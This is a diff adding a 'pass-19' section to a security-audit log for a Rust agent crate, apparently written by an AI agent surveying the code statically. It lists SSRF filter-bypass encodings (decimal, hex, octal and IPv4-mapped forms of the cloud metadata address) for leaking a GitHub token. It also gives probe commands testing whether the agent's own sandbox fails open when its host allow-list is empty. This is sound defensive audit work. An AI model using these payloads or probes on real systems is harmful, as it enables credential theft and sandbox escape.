@@ -2512,3 +2512,32 @@ pass-18 summary
 - 0 new mitigations, 1 path remap (crate rename nyx-agent-api → nyctos-api), 2 new findings.
 - new findings target webhook.rs which pass-1..17 had not enumerated (router.rs-centric scope drift).
 - tool budget ~6 / 24 used; halted on quality-over-count per task brief.
+
+---
+pass-19 findings (exploration: crates/nyx-agent, static survey only — ALLOWED HOSTS empty, no HTTP probe issued)
+
+{
+  "path": "crates/nyx-agent/src/cmd/pr_comment.rs",
+  "line": 329,
+  "cap": "SSRF",
+  "endpoint": "<cli:nyx-agent pr-comment --gh-api>",
+  "rationale": "validate_gh_api_url ships the GitHub bearer token (Authorization: Bearer …) to whatever host the caller passes. The block-list is too narrow: it rejects only the four IMDS literals and `169.254.x.x` / `fe80:` startswith. It does NOT reject RFC1918 ranges (10/8, 172.16/12, 192.168/16), CGNAT 100.64/10, 0.0.0.0, loopback aliases beyond `127.0.0.1` (e.g. `127.0.0.2`, `127.1` short-form is parsed by some resolvers), or numeric-encoded forms that reqwest/url crate happily resolve to IMDS: `https://2852039166/` (decimal 169.254.169.254), `https://0xa9.0xfe.0xa9.0xfe/`, `https://0251.0254.0251.0254/`. The IPv6 block matches only the exact strings `fd00:ec2::254` and a `fe80:` prefix; `https://[::ffff:169.254.169.254]/` (IPv4-mapped), `https://[::ffff:a9fe:a9fe]/`, fully-expanded `https://[fd00:ec2:0:0:0:0:0:254]/`, or with a zone id (`%eth0`) all slip past. The docstring acknowledges the threat model (`pull_request_target` interpolating forked-PR input) but the implementation only stops the obvious literals. Net effect: forked-PR YAML or a compromised actions input can exfiltrate `GITHUB_TOKEN` to any RFC1918 box on the runner network, or to IMDS via numeric encoding.",
+  "suggested_payload_hint": "set --gh-api=https://2852039166/ (decimal-encoded 169.254.169.254) and watch for an Authorization: Bearer header in the captured request on an interception sink, or --gh-api=https://10.0.0.5/ for the lateral-movement variant. Defence: parse with `url::Url`, resolve the host string with `IpAddr::from_str` (and reject every dotted/octal/hex/decimal encoding that resolves to a private, loopback, link-local, multicast, or unspecified address), then re-block IPv4-mapped IPv6 via `Ipv6Addr::to_ipv4_mapped`."
+}
+
+---
+{
+  "path": "crates/nyx-agent/src/ai_pipeline.rs",
+  "line": 2312,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "<sandbox:chain-lane allowed_hosts>",
+  "rationale": "build_exploration_scope unconditionally writes `scope.allowed_hosts = Vec::new()` and `scope.target_endpoints = Vec::new()` with a comment noting that the operator wiring lands in a later settings phase. The exploration agent's prompt (this very task) instructs the model to refuse HTTP when no hosts are listed, but enforcement that depends on the agent honouring the prompt is a state-machine flaw, not a sandbox check. The agent's tool surface includes `http.probe`; whether that tool refuses on an empty allow-list, fail-opens to `*`, or refuses only on an *exact* miss is not asserted here and has no test in this file. If the chain-lane sandbox interprets `allowed_hosts.is_empty()` as 'no restriction configured ⇒ allow' (a common defaulting mistake on the deny-list side of an allow/deny toggle), every exploration run can reach arbitrary hosts on the runner network with no audit override. Even if today's sandbox refuses on empty, the contract that 'empty == deny-all' is asserted nowhere in this crate, so a future refactor that hooks an operator-supplied list into the scope can flip the semantic without breaking any test. Static pass missed because the absence-of-test is invisible to a taint scanner.",
+  "suggested_payload_hint": "from inside the chain-lane, issue `http.probe https://169.254.169.254/latest/meta-data/` and `http.probe https://10.0.0.1/` against the run-shared workspace; expected behaviour is a hard refuse with audit row `denied: empty allow-list`. If either resolves a 200 (or any non-refuse response code), the sandbox is fail-open on empty allow_hosts. Defence: encode the empty-list contract in nyctos-sandbox with a unit test that constructs an ExplorationScope with `allowed_hosts = vec![]` and asserts every `http.probe` returns `ExplorationError::HostNotAllowed`; mirror the assertion at scope-build time in this file."
+}
+
+---
+pass-19 summary
+- 2 new findings, both targeting the agent crate itself (meta-vuln: tools that drive verification can be turned against the operator's secrets / sandbox boundary).
+- finding 1: SSRF allow-list gap on --gh-api lets forked-PR YAML steer GITHUB_TOKEN to internal hosts or IMDS via numeric encodings; pass-1..18 reviewed handler crates only.
+- finding 2: empty allowed_hosts on the exploration scope encodes "deny-all" implicitly; no test in this crate pins the semantic, and the prompt-level guard is not an enforcement boundary.
+- tool budget ~10 / 24 used; halted on quality-over-count.
